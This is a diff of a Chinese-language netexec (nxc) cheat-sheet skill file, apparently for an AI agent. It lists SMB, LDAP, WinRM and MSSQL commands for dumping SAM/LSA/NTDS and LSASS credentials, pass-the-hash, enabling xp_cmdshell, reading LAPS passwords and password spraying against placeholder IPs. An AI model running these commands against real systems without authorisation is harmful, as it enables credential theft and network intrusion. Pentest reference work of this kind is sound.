@@ -4,7 +4,6 @@ description: 'netexec (nxc) 全面参考：SMB/LDAP/WinRM/MSSQL 核心命令、�
 disable-model-invocation: true
 metadata: { domain: tools, tier: T2 }
 ---
-> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
 
 # netexec (nxc) — CrackMapExec 继任者全面参考
 
@@ -21,7 +20,7 @@ nxc smb 10.10.10.10 -u 'u' -p 'p' --pass-pol             # 密码策略
 nxc smb 10.10.10.10 -u 'u' -p 'p' -x 'whoami'            # cmd 执行
 nxc smb 10.10.10.10 -u 'u' -p 'p' --sam / --lsa / --ntds # dump
 nxc smb 10.10.10.0/24 --gen-relay-list targets.txt       # 找可 relay 主机
-```
+```text
 
 ## LDAP 最常用
 ```bash
@@ -33,14 +32,14 @@ nxc ldap 10.10.10.10 -u 'u' -p 'p' -M dmsa               # dMSA 账户
 nxc ldap 10.10.10.10 -u 'u' -p 'p' -M laps               # LAPS 密码
 nxc ldap 10.10.10.10 -u 'u' -p 'p' -M adcs               # ADCS 枚举
 nxc ldap 10.10.10.10 -u 'u' -p 'p' -M daclread -o TARGET=user WRITE=true
-```
+```text
 
 ## WinRM
 ```bash
 nxc winrm 10.10.10.10 -u 'u' -p 'p'                      # 验证
 nxc winrm 10.10.10.10 -u 'u' -H 'HASH'                   # PTH
 nxc winrm 10.10.10.10 -u 'u' -p 'p' -x 'whoami'          # 执行
-```
+```text
 
 ## MSSQL
 ```bash
@@ -48,7 +47,7 @@ nxc mssql 10.10.10.10 -u 'sa' -p 'pass'                  # 验证
 nxc mssql 10.10.10.10 -u 'sa' -p 'pass' -M mssql_priv    # 权限检查
 nxc mssql 10.10.10.10 -u 'sa' -p 'pass' -x 'whoami'      # xp_cmdshell
 nxc mssql 10.10.10.10 -u 'sa' -p 'pass' --enable-xpcmdshell
-```
+```text
 
 ## 模块 (nxc smb -L / nxc ldap -L)
 - lsassy / nanodump → dump LSASS 凭据
@@ -62,7 +61,7 @@ nxc mssql 10.10.10.10 -u 'sa' -p 'pass' --enable-xpcmdshell
 ```bash
 nxc smb 10.10.10.10 -u users.txt -p 'SinglePass!' --no-bruteforce
 nxc smb 10.10.10.10 -u users.txt -p pwd.txt --continue-on-success
-```
+```text
 
 ## 对比 cme
 - 语法 95% 相同，直接替换 `crackmapexec` → `nxc` 或 `netexec`
